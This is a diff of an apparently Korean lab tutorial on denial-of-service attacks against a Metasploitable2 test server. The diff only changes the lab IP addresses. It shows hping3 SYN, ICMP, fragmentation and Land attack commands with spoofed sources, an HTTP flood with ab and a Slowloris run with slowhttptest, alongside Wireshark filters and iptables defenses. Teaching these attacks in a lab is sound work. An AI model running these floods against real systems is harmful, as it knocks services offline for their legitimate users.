@@ -20,8 +20,8 @@ mermaid: true
 > 중요한 점은 “서버를 뚫는 것”이 아니라 “정상 사용자가 서비스를 이용하지 못하게 하는 것”입니다.
 {: .prompt-info }
 
-> **이번 실습 대상**: Metasploitable2 `192.168.0.100` (오래된 취약 서버 — Teardrop·Land 같은 구형 공격이 재현되는 대상)  
-> 공격자는 Kali `192.168.0.10`, 인터페이스는 대상에서 `eth0`를 사용합니다.
+> **이번 실습 대상**: Metasploitable2 `192.168.60.100` (오래된 취약 서버 — Teardrop·Land 같은 구형 공격이 재현되는 대상)  
+> 공격자는 Kali `192.168.60.10`, 인터페이스는 대상에서 `eth0`를 사용합니다.
 {: .prompt-info }
 
 > **학습목표**
@@ -88,9 +88,9 @@ TCP 연결은 `SYN → SYN-ACK → ACK`의 3-way handshake로 맺어집니다. �
 
 ```bash
 # -S: SYN 플래그, --flood: 최대 속도, --rand-source: 출발지 IP 무작위 위조
-sudo hping3 -S --flood -V -p 80 --rand-source 192.168.0.100
+sudo hping3 -S --flood -V -p 80 --rand-source 192.168.60.100
 # 실습용 제한 버전(권장): 개수를 제한해 관찰
-sudo hping3 -S -p 80 -c 50 --rand-source 192.168.0.100
+sudo hping3 -S -p 80 -c 50 --rand-source 192.168.60.100
 ```
 
 **관찰** — Wireshark 필터 `tcp.flags.syn==1 && tcp.flags.ack==0`으로 순수 SYN만 보면 초당 수천 개가 쏟아지는 모습이 보입니다. 표적에서는 반쪽 연결 개수를 셉니다.
@@ -136,14 +136,14 @@ ICMP는 원래 네트워크 진단용(`ping`)입니다. 대상은 Echo Request�
 
 ```bash
 # 기본 ping flood (-f: 최대 속도, -s: 패킷 크기)
-sudo ping -f -s 65500 192.168.0.100
+sudo ping -f -s 65500 192.168.60.100
 # hping3 ICMP flood (-d: 데이터 크기)
-sudo hping3 --icmp --flood -V -d 1400 192.168.0.100
+sudo hping3 --icmp --flood -V -d 1400 192.168.60.100
 ```
 
 ![Kali에서 hping3 ICMP flood 실행 화면](/assets/img/posts/2026-06-10-networkset-09-icmpflood-kali.png)
 
-**Wireshark 관찰** — 캡처 필터 `icmp and host 192.168.0.100`. 대량의 Echo Request/Reply와 큰 패킷 크기, `Statistics > I/O Graph`의 사용률 급증을 확인합니다.
+**Wireshark 관찰** — 캡처 필터 `icmp and host 192.168.60.100`. 대량의 Echo Request/Reply와 큰 패킷 크기, `Statistics > I/O Graph`의 사용률 급증을 확인합니다.
 
 ![Wireshark에 잡힌 대량의 ICMP Echo Request/Reply](/assets/img/posts/2026-06-10-networkset-09-icmpflood-wireshark.png)
 
@@ -197,7 +197,7 @@ IP는 MTU보다 큰 데이터를 여러 **단편(fragment)**으로 나눠 보내
 
 ```bash
 # 최대 크기를 초과하는 조각난 ICMP 전송
-sudo hping3 -1 -d 65495 --frag -c 5 192.168.0.100
+sudo hping3 -1 -d 65495 --frag -c 5 192.168.60.100
 ```
 
 **Wireshark 관찰** — 필터 `ip.flags.mf == 1 or ip.frag_offset > 0`. 동일 ID의 여러 단편, 겹치는 오프셋을 확인합니다.
@@ -226,7 +226,7 @@ Land Attack은 **출발지 IP·Port와 목적지 IP·Port를 동일하게** 위�
 
 ```bash
 # -a: 출발지 IP를 대상과 동일하게, -s/-p: 출발지·목적지 포트 동일
-sudo hping3 -S -a 192.168.0.100 -p 80 -s 80 192.168.0.100
+sudo hping3 -S -a 192.168.60.100 -p 80 -s 80 192.168.60.100
 ```
 
 **Wireshark 관찰** — 필터 `ip.src == ip.dst`. 출발지·목적지가 같은 SYN 패킷을 확인합니다.
@@ -235,7 +235,7 @@ sudo hping3 -S -a 192.168.0.100 -p 80 -s 80 192.168.0.100
 
 ```bash
 # 출발지=목적지 패킷 차단
-sudo iptables -A INPUT -p tcp -m tcp --tcp-flags SYN SYN -s 192.168.0.100 -d 192.168.0.100 -j DROP
+sudo iptables -A INPUT -p tcp -m tcp --tcp-flags SYN SYN -s 192.168.60.100 -d 192.168.60.100 -j DROP
 # 루프백/예약 대역 위조 차단
 sudo iptables -A INPUT -p tcp -m tcp --tcp-flags SYN SYN -s 127.0.0.0/8 -j DROP
 ```
@@ -251,7 +251,7 @@ sudo iptables -A INPUT -p tcp -m tcp --tcp-flags SYN SYN -s 127.0.0.0/8 -j DROP
 ```bash
 # Apache Benchmark: -n 총 요청 수, -c 동시 연결 수
 sudo apt-get install apache2-utils
-ab -n 100000 -c 1000 http://192.168.0.100/
+ab -n 100000 -c 1000 http://192.168.60.100/
 ```
 
 **방어**
@@ -276,7 +276,7 @@ Slowloris는 반대로 **아주 느리게** 동작합니다. HTTP 헤더를 완�
 ```bash
 sudo apt install slowhttptest -y
 # -c 동시연결, -H 느린 헤더(Slowloris) 모드, -i 10 10초마다 조금씩, -r 200 초당 연결 생성
-slowhttptest -c 500 -H -i 10 -r 200 -u http://192.168.0.100/
+slowhttptest -c 500 -H -i 10 -r 200 -u http://192.168.60.100/
 ```
 
 > **왜?** `-H`가 Slowloris 방식(헤더를 찔끔찔끔 보내 연결을 붙잡는 모드)을 지정합니다. 도구 화면의 상태 표시가 **`service available: NO`**로 바뀌고 다른 브라우저의 접속도 느려지거나 실패하면, **적은 대역폭만으로** 서버가 마비됐다는 뜻입니다 — Slowloris의 위력을 직접 확인하는 순간입니다. 확인 후 `Ctrl+C`로 즉시 멈춥니다.
